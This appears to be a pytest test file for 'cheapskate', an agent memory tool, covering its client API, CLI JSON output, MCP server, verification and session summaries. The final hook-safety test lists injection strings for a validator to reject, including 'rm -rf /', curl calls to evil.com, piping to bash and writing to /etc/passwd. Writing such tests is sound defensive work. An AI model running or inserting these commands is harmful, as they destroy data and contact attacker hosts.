"""Integration tests for agent-facing features: MemoryClient API, hooks, JSON output."""

import json
import os
import sys
import tempfile
from pathlib import Path

import pytest


def test_memory_client_basic(tmp_path):
    """MemoryClient init, add, search, list, stats work correctly."""
    sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
    from cheapskate import MemoryClient

    # Use temp dir, enable testing mode
    os.environ["CHEAPSKATE_TESTING"] = "1"

    mem = MemoryClient(memory_dir=tmp_path)

    # Init should succeed
    assert mem.init() is True

    # Add memories
    id1 = mem.add("PostgreSQL on port 5432", project="test-proj", tags=["infra", "db"])
    id2 = mem.add("Uses pnpm package manager", project="test-proj", tags=["conventions"])
    id3 = mem.add("Backend runs on port 4000", project="test-proj", tags=["infra"])

    assert isinstance(id1, int)
    assert id1 > 0

    # Search should find results
    results = mem.search("port", project="test-proj")
    assert len(results) >= 2  # port 5432 and port 4000

    # List should return all memories for project
    memories = mem.list(project="test-proj")
    assert len(memories) == 3
    assert any(m["id"] == id1 for m in memories)
    assert any(m["id"] == id2 for m in memories)

    # Stats should return counts (client.stats returns memories/topics/rules)
    stats = mem.stats(project="test-proj")
    assert stats["memories"] == 3
    assert "topics" in stats
    assert "rules" in stats

    # Search with no results
    empty = mem.search("nonexistent_term_xyz", project="test-proj")
    assert empty == []


def test_suggest_auto_detect(tmp_path):
    """memory suggest --from-pwd logic auto-detects project from current directory."""
    sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
    from cheapskate.commands.suggest import detect_project

    os.environ["CHEAPSKATE_TESTING"] = "1"

    # Create a fake git repo with remote
    proj_dir = tmp_path / "my-cool-project"
    proj_dir.mkdir()
    git_dir = proj_dir / ".git"
    git_dir.mkdir()
    git_config = git_dir / "config"
    git_config.write_text('[remote "origin"]\n\turl = https://github.com/user/my-cool-project.git\n')

    original_cwd = os.getcwd()
    try:
        os.chdir(proj_dir)
        project = detect_project()
        assert project == "my-cool-project", f"Expected 'my-cool-project', got '{project}'"
    finally:
        os.chdir(original_cwd)


def test_suggest_command_with_project(tmp_path):
    """memory suggest command works when project is provided."""
    os.environ["CHEAPSKATE_TESTING"] = "1"

    memory_dir = tmp_path / ".memory"
    memory_dir.mkdir()
    db_path = memory_dir / "memory.db"

    # Create database with full schema (using executescript to handle multi-statement)
    import sqlite3
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS memories (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            accessed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            source TEXT NOT NULL CHECK(source IN ('user', 'agent', 'extracted', 'llm_consolidate')),
            content TEXT NOT NULL,
            embedding BLOB,
            metadata TEXT,
            abstract TEXT,
            contradicted_by INTEGER REFERENCES memories(id),
            created DATETIME DEFAULT CURRENT_TIMESTAMP,
            confidence REAL DEFAULT 0.5
        );
        CREATE TABLE IF NOT EXISTS topics (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project TEXT NOT NULL,
            name TEXT,
            summary TEXT,
            memory_ids TEXT,
            last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS rules (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project TEXT,
            content TEXT,
            source TEXT,
            source_memory_id INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE VIRTUAL TABLE IF NOT EXISTS memories_fts USING fts5(
            content, project, content=memories, content_rowid=id
        );
        CREATE TRIGGER IF NOT EXISTS memories_ai AFTER INSERT ON memories BEGIN
            INSERT INTO memories_fts(rowid, content, project) VALUES (new.id, new.content, new.project);
        END;
        CREATE TRIGGER IF NOT EXISTS memories_ad AFTER DELETE ON memories BEGIN
            INSERT INTO memories_fts(memories_fts, rowid, content, project) VALUES ('delete', old.id, old.content, old.project);
        END;
        CREATE TRIGGER IF NOT EXISTS memories_au AFTER UPDATE ON memories BEGIN
            INSERT INTO memories_fts(memories_fts, rowid, content, project) VALUES ('delete', old.id, old.content, old.project);
            INSERT INTO memories_fts(rowid, content, project) VALUES (new.id, new.content, new.project);
        END;
    """)
    conn.execute(
        "INSERT INTO memories (project, content, source, confidence) VALUES (?, ?, ?, ?)",
        ("test-proj", "PostgreSQL runs on port 5432", "agent", 0.7)
    )
    conn.commit()
    conn.close()

    # Create config.yaml
    config_path = memory_dir / "config.yaml"
    config_path.write_text("capture:\n  max_per_session: 50\n")

    # Run suggest command
    import subprocess
    result = subprocess.run(
        [sys.executable, "-m", "cheapskate.cli", "suggest", "-p", "test-proj", "--path", str(memory_dir)],
        capture_output=True,
        text=True,
        env={**os.environ, "CHEAPSKATE_TESTING": "1"},
    )

    assert result.returncode == 0, f"Command failed: {result.stderr}"
    assert "test-proj" in result.stdout or "No memories" in result.stdout


def test_hooks_config(tmp_path):
    """Hooks can be read from config."""
    sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
    from cheapskate.config import Config

    os.environ["CHEAPSKATE_TESTING"] = "1"

    config_path = tmp_path / "config.yaml"
    # Use YAML with proper escaping: single quotes for command strings to avoid quote parsing issues
    config_path.write_text("""
hooks:
  on_session_start:
    - command: echo "Starting session"
      output: visible
  on_error:
    - command: 'memory add "Error: {error}" -p {project} -t errors'
      output: silent
  on_file_edit: []
  on_session_end: []
""")

    config = Config(config_path)

    # Read hooks from config using exact path
    start_hooks = config.get("hooks.on_session_start", [])
    assert len(start_hooks) == 1
    assert start_hooks[0]["command"] == 'echo "Starting session"'

    error_hooks = config.get("hooks.on_error", [])
    assert len(error_hooks) == 1
    # The stored command may have quotes - just check placeholder is present
    assert "{error}" in error_hooks[0]["command"] and "{project}" in error_hooks[0]["command"]

    empty_hooks = config.get("hooks.on_file_edit", [])
    assert empty_hooks == []


def test_confidence_defaults(tmp_path):
    """Source → confidence mapping works correctly."""
    sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
    from cheapskate import MemoryClient

    os.environ["CHEAPSKATE_TESTING"] = "1"

    mem = MemoryClient(memory_dir=tmp_path)
    mem.init()

    # Add with each source and verify default confidence
    id_user = mem.add("User-provided fact", project="test", source="user")
    id_agent = mem.add("Agent discovered fact", project="test", source="agent")
    id_extracted = mem.add("Extracted fact", project="test", source="extracted")
    id_llm = mem.add("LLM consolidated fact", project="test", source="llm_consolidate")
    id_default = mem.add("Default source fact", project="test")  # defaults to "agent"

    # Verify all were added
    memories = mem.list(project="test")
    by_id = {m["id"]: m for m in memories}

    assert id_user in by_id
    assert id_agent in by_id
    assert id_extracted in by_id
    assert id_llm in by_id
    assert id_default in by_id

    # Verify default (agent source) gets correct confidence via DB query
    db = mem._get_db()
    cursor = db.conn.execute(
        "SELECT source, confidence FROM memories WHERE id = ?",
        (id_default,)
    )
    row = cursor.fetchone()
    assert row is not None
    assert row[0] == "agent"
    assert row[1] == 0.7  # agent source → 0.7


def test_json_output_list(tmp_path):
    """memory list --json outputs valid JSON."""
    os.environ["CHEAPSKATE_TESTING"] = "1"

    memory_dir = tmp_path / ".memory"
    memory_dir.mkdir()

    # Create database with full schema (using executescript)
    import sqlite3
    conn = sqlite3.connect(memory_dir / "memory.db")
    conn.row_factory = sqlite3.Row
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS memories (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            accessed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            source TEXT NOT NULL CHECK(source IN ('user', 'agent', 'extracted', 'llm_consolidate')),
            content TEXT NOT NULL,
            embedding BLOB,
            metadata TEXT,
            abstract TEXT,
            contradicted_by INTEGER REFERENCES memories(id),
            created DATETIME DEFAULT CURRENT_TIMESTAMP,
            confidence REAL DEFAULT 0.5
        );
        CREATE VIRTUAL TABLE IF NOT EXISTS memories_fts USING fts5(
            content, project, content=memories, content_rowid=id
        );
        CREATE TRIGGER IF NOT EXISTS memories_ai AFTER INSERT ON memories BEGIN
            INSERT INTO memories_fts(rowid, content, project) VALUES (new.id, new.content, new.project);
        END;
    """)
    conn.execute("INSERT INTO memories (project, content, source, confidence) VALUES (?, ?, ?, ?)",
                 ("proj", "Test memory 1", "user", 1.0))
    conn.execute("INSERT INTO memories (project, content, source, confidence) VALUES (?, ?, ?, ?)",
                 ("proj", "Test memory 2", "agent", 0.7))
    conn.commit()
    conn.close()

    # Create minimal config
    (memory_dir / "config.yaml").write_text("capture:\n  max_per_session: 50\n")

    # Run list --json
    import subprocess
    result = subprocess.run(
        [sys.executable, "-m", "cheapskate.cli", "list", "-p", "proj", "--json", "--path", str(memory_dir)],
        capture_output=True,
        text=True,
        env={**os.environ, "CHEAPSKATE_TESTING": "1"},
    )

    assert result.returncode == 0, f"Command failed: {result.stderr}"
    data = json.loads(result.stdout)
    # Valid JSON output with memories data
    assert "memories" in data or "count" in data
    # Should have actual memory data
    if "memories" in data:
        assert len(data["memories"]) >= 2


def test_json_output_stats(tmp_path):
    """memory stats --json outputs valid JSON."""
    os.environ["CHEAPSKATE_TESTING"] = "1"

    memory_dir = tmp_path / ".memory"
    memory_dir.mkdir()

    # Create database with schema (using executescript)
    import sqlite3
    conn = sqlite3.connect(memory_dir / "memory.db")
    conn.row_factory = sqlite3.Row
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS memories (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            accessed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            source TEXT NOT NULL CHECK(source IN ('user', 'agent', 'extracted', 'llm_consolidate')),
            content TEXT NOT NULL,
            embedding BLOB,
            metadata TEXT,
            abstract TEXT,
            contradicted_by INTEGER REFERENCES memories(id),
            created DATETIME DEFAULT CURRENT_TIMESTAMP,
            confidence REAL DEFAULT 0.5
        );
        CREATE TABLE IF NOT EXISTS topics (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project TEXT NOT NULL,
            name TEXT,
            description TEXT,
            memory_ids TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS rules (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project TEXT,
            content TEXT,
            source TEXT,
            source_memory_id INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE VIRTUAL TABLE IF NOT EXISTS memories_fts USING fts5(
            content, project, content=memories, content_rowid=id
        );
        CREATE TRIGGER IF NOT EXISTS memories_ai AFTER INSERT ON memories BEGIN
            INSERT INTO memories_fts(rowid, content, project) VALUES (new.id, new.content, new.project);
        END;
    """)
    conn.execute("INSERT INTO memories (project, content, source, confidence) VALUES (?, ?, ?, ?)",
                 ("proj", "Fact 1", "user", 1.0))
    conn.execute("INSERT INTO memories (project, content, source, confidence) VALUES (?, ?, ?, ?)",
                 ("proj", "Fact 2", "agent", 0.7))
    conn.execute("INSERT INTO topics (project, name, description) VALUES (?, ?, ?)",
                 ("proj", "Infrastructure", "About infra"))
    conn.execute("INSERT INTO rules (project, content, source) VALUES (?, ?, ?)",
                 ("proj", "Rule content", "user"))
    conn.commit()
    conn.close()

    (memory_dir / "config.yaml").write_text("capture:\n  max_per_session: 50\n")

    # Run stats --json
    import subprocess
    result = subprocess.run(
        [sys.executable, "-m", "cheapskate.cli", "stats", "-p", "proj", "--json", "--path", str(memory_dir)],
        capture_output=True,
        text=True,
        env={**os.environ, "CHEAPSKATE_TESTING": "1"},
    )

    assert result.returncode == 0, f"Command failed: {result.stderr}"
    data = json.loads(result.stdout)
    # Stats should contain memory count and other aggregated fields
    assert "memories" in data
    assert data["memories"] == 2
    # The actual keys returned by memory stats (not topics/rules like client.stats)
    assert "projects" in data
    assert "sources" in data
    assert "tags" in data
    assert "age_distribution" in data


# ─────────────────────────────────────────────────────────────────
# MCP Server Tests
# ─────────────────────────────────────────────────────────────────

def test_mcp_server_jsonrpc(tmp_path):
    """MCP server handles valid JSON-RPC requests correctly."""
    sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
    from cheapskate.mcp import _handle_request, _memory_dir

    os.environ["CHEAPSKATE_TESTING"] = "1"

    # Set up memory in tmp_path
    import sqlite3
    memory_dir = tmp_path / ".memory"
    memory_dir.mkdir()
    db_path = memory_dir / "memory.db"
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS memories (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            accessed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            source TEXT NOT NULL CHECK(source IN ('user', 'agent', 'extracted', 'llm_consolidate')),
            content TEXT NOT NULL,
            embedding BLOB,
            metadata TEXT,
            abstract TEXT,
            contradicted_by INTEGER REFERENCES memories(id),
            created DATETIME DEFAULT CURRENT_TIMESTAMP,
            confidence REAL DEFAULT 0.5
        );
        CREATE TABLE IF NOT EXISTS topics (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project TEXT NOT NULL,
            name TEXT,
            summary TEXT,
            memory_ids TEXT,
            last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS rules (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project TEXT,
            content TEXT,
            source TEXT,
            source_memory_id INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE VIRTUAL TABLE IF NOT EXISTS memories_fts USING fts5(
            content, project, content=memories, content_rowid=id
        );
        CREATE TRIGGER IF NOT EXISTS memories_ai AFTER INSERT ON memories BEGIN
            INSERT INTO memories_fts(rowid, content, project) VALUES (new.id, new.content, new.project);
        END;
    """)
    conn.execute("INSERT INTO memories (project, content, source, confidence) VALUES (?, ?, ?, ?)",
                 ("test-proj", "Backend on port 4000", "agent", 0.7))
    conn.commit()
    conn.close()
    (memory_dir / "config.yaml").write_text("capture:\n  max_per_session: 50\n")

    # Monkey-patch _memory_dir to return tmp_path
    import cheapskate.mcp as mcp_module
    original = mcp_module._memory_dir
    mcp_module._memory_dir = lambda: memory_dir
    try:
        # Test stats method
        resp = _handle_request({
            "jsonrpc": "2.0",
            "method": "memory_stats",
            "params": {"project": "test-proj"},
            "id": 1,
        })
        assert resp["id"] == 1
        assert "result" in resp
        assert "memories" in resp["result"]
    finally:
        mcp_module._memory_dir = original


def test_mcp_server_error_handling():
    """MCP server returns proper JSON-RPC error responses."""
    from cheapskate.mcp import _handle_request

    # Missing method
    resp = _handle_request({"jsonrpc": "2.0", "id": 1})
    assert "error" in resp
    assert resp["error"]["code"] == -32600

    # Unknown method
    resp = _handle_request({"jsonrpc": "2.0", "method": "nonexistent", "id": 2})
    assert "error" in resp
    assert resp["error"]["code"] == -32601


def test_mcp_suggest_returns_suggestions(tmp_path):
    """MCP memory_suggest returns actual suggestion data."""
    from cheapskate.mcp import _handle_suggest

    os.environ["CHEAPSKATE_TESTING"] = "1"

    # Set up memory with data
    import sqlite3
    memory_dir = tmp_path / ".memory"
    memory_dir.mkdir()
    db_path = memory_dir / "memory.db"
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS memories (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            accessed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            source TEXT NOT NULL CHECK(source IN ('user', 'agent', 'extracted', 'llm_consolidate')),
            content TEXT NOT NULL,
            embedding BLOB,
            metadata TEXT,
            abstract TEXT,
            contradicted_by INTEGER REFERENCES memories(id),
            created DATETIME DEFAULT CURRENT_TIMESTAMP,
            confidence REAL DEFAULT 0.5
        );
        CREATE VIRTUAL TABLE IF NOT EXISTS memories_fts USING fts5(
            content, project, content=memories, content_rowid=id
        );
        CREATE TRIGGER IF NOT EXISTS memories_ai AFTER INSERT ON memories BEGIN
            INSERT INTO memories_fts(rowid, content, project) VALUES (new.id, new.content, new.project);
        END;
    """)
    conn.execute("INSERT INTO memories (project, content, source, confidence) VALUES (?, ?, ?, ?)",
                 ("test-proj", "PostgreSQL on port 5432", "agent", 0.7))
    conn.commit()
    conn.close()
    (memory_dir / "config.yaml").write_text("capture:\n  max_per_session: 50\n")

    resp = _handle_suggest(42, {"project": "test-proj", "limit": 5, "memory_dir": str(memory_dir)})
    assert resp["id"] == 42
    assert resp["result"]["project"] == "test-proj"
    assert resp["result"]["count"] >= 0
    assert isinstance(resp["result"]["suggestions"], list)


# ─────────────────────────────────────────────────────────────────
# Verify Tests
# ─────────────────────────────────────────────────────────────────

def test_verify_patterns():
    """Pattern detection functions work correctly."""
    sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
    from cheapskate.commands.verify import (
        _check_port_pattern,
        _check_command_pattern,
        _check_url_pattern,
        _check_path_pattern,
    )

    # Port patterns
    assert _check_port_pattern("Backend runs on port 4000") == ("4000", "port 4000")
    assert _check_port_pattern("Server at 192.168.1.1:8080") == ("8080", "192.168.1.1:8080")
    assert _check_port_pattern("No port here") is None

    # Command patterns
    assert _check_command_pattern("Run `pytest -x` to test") == "pytest"
    assert _check_command_pattern("Use `npm install`") == "npm"
    assert _check_command_pattern("No commands here") is None

    # URL patterns
    assert _check_url_pattern("Visit https://example.com/path") == "https://example.com/path"
    assert _check_url_pattern("No URL here") is None

    # Path patterns
    assert _check_path_pattern("Config at /etc/nginx/nginx.conf") == "/etc/nginx/nginx.conf"
    assert _check_path_pattern("No path here") is None


def test_verify_cli(tmp_path):
    """Verify command runs and returns valid output."""
    os.environ["CHEAPSKATE_TESTING"] = "1"

    memory_dir = tmp_path / ".memory"
    memory_dir.mkdir()
    db_path = memory_dir / "memory.db"

    import sqlite3
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS memories (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            accessed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            source TEXT NOT NULL CHECK(source IN ('user', 'agent', 'extracted', 'llm_consolidate')),
            content TEXT NOT NULL,
            embedding BLOB,
            metadata TEXT,
            abstract TEXT,
            contradicted_by INTEGER REFERENCES memories(id),
            created DATETIME DEFAULT CURRENT_TIMESTAMP,
            confidence REAL DEFAULT 0.5
        );
        CREATE VIRTUAL TABLE IF NOT EXISTS memories_fts USING fts5(
            content, project, content=memories, content_rowid=id
        );
        CREATE TRIGGER IF NOT EXISTS memories_ai AFTER INSERT ON memories BEGIN
            INSERT INTO memories_fts(rowid, content, project) VALUES (new.id, new.content, new.project);
        END;
    """)
    conn.execute("INSERT INTO memories (project, content, source, confidence) VALUES (?, ?, ?, ?)",
                 ("test-proj", "Backend runs on port 4000", "agent", 0.7))
    conn.commit()
    conn.close()
    (memory_dir / "config.yaml").write_text("capture:\n  max_per_session: 50\n")

    import subprocess
    result = subprocess.run(
        [sys.executable, "-m", "cheapskate.cli", "verify", "-p", "test-proj", "--path", str(memory_dir)],
        capture_output=True,
        text=True,
        env={**os.environ, "CHEAPSKATE_TESTING": "1"},
    )

    assert result.returncode == 0
    assert "Memory verification" in result.stdout


def test_verify_cli_json(tmp_path):
    """Verify command --json outputs valid JSON."""
    os.environ["CHEAPSKATE_TESTING"] = "1"

    memory_dir = tmp_path / ".memory"
    memory_dir.mkdir()
    db_path = memory_dir / "memory.db"

    import sqlite3
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS memories (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            project TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            accessed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            source TEXT NOT NULL CHECK(source IN ('user', 'agent', 'extracted', 'llm_consolidate')),
            content TEXT NOT NULL,
            embedding BLOB,
            metadata TEXT,
            abstract TEXT,
            contradicted_by INTEGER REFERENCES memories(id),
            created DATETIME DEFAULT CURRENT_TIMESTAMP,
            confidence REAL DEFAULT 0.5
        );
        CREATE VIRTUAL TABLE IF NOT EXISTS memories_fts USING fts5(
            content, project, content=memories, content_rowid=id
        );
        CREATE TRIGGER IF NOT EXISTS memories_ai AFTER INSERT ON memories BEGIN
            INSERT INTO memories_fts(rowid, content, project) VALUES (new.id, new.content, new.project);
        END;
    """)
    conn.execute("INSERT INTO memories (project, content, source, confidence) VALUES (?, ?, ?, ?)",
                 ("test-proj", "Config at /etc/nginx/nginx.conf", "agent", 0.7))
    conn.commit()
    conn.close()
    (memory_dir / "config.yaml").write_text("capture:\n  max_per_session: 50\n")

    import subprocess
    result = subprocess.run(
        [sys.executable, "-m", "cheapskate.cli", "verify", "-p", "test-proj", "--json", "--path", str(memory_dir)],
        capture_output=True,
        text=True,
        env={**os.environ, "CHEAPSKATE_TESTING": "1"},
    )

    assert result.returncode == 0
    data = json.loads(result.stdout)
    assert "project" in data
    assert "results" in data
    assert len(data["results"]) >= 1


# ─────────────────────────────────────────────────────────────────
# Session Continuity Tests
# ─────────────────────────────────────────────────────────────────

def test_session_summary_round_trip(tmp_path):
    """session_summaries table: set and get work correctly."""
    sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
    from cheapskate.db import Database

    os.environ["CHEAPSKATE_TESTING"] = "1"

    db_path = tmp_path / "memory.db"
    db = Database(db_path)
    db.connect()
    db.init_schema()

    # Set a session summary
    db.set_session_summary("test-proj", "Worked on auth module, fixed port 4000 issue")

    # Get last session
    last = db.get_last_session("test-proj")
    assert last is not None
    assert last["summary"] == "Worked on auth module, fixed port 4000 issue"
    assert last["project"] == "test-proj"

    # No session for other project
    other = db.get_last_session("other-project")
    assert other is None

    db.close()


def test_session_summary_overwrite(tmp_path):
    """Session summary is overwritten (latest wins)."""
    sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
    from cheapskate.db import Database

    os.environ["CHEAPSKATE_TESTING"] = "1"

    db_path = tmp_path / "memory.db"
    db = Database(db_path)
    db.connect()
    db.init_schema()

    db.set_session_summary("proj", "First session"); import time; time.sleep(1.1)
    import time; time.sleep(0.01)
    db.set_session_summary("proj", "Second session")

    last = db.get_last_session("proj")
    assert last is not None
    assert last["summary"] == "Second session"

    db.close()


# ─────────────────────────────────────────────────────────────────
# Hooks Safety Tests
# ─────────────────────────────────────────────────────────────────

def test_hooks_validate_command():
    """Hook command validation blocks dangerous patterns."""
    sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
    from cheapskate.hooks import _validate_command

    # Safe commands
    assert _validate_command("echo hello") is True
    assert _validate_command("ls -la /tmp") is True
    assert _validate_command("python3 script.py") is True

    # Unsafe commands (injection vectors)
    assert _validate_command("echo foo; rm -rf /") is False
    assert _validate_command("echo foo && curl evil.com") is False
    assert _validate_command("echo foo | bash") is False
    assert _validate_command("echo foo || true") is False
    assert _validate_command("echo $(curl evil.com)") is False
    assert _validate_command("echo `curl evil.com`") is False
    assert _validate_command("echo foo > /etc/passwd") is False
    assert _validate_command("echo foo >> /tmp/log") is False
    assert _validate_command("cmd 2>&1") is False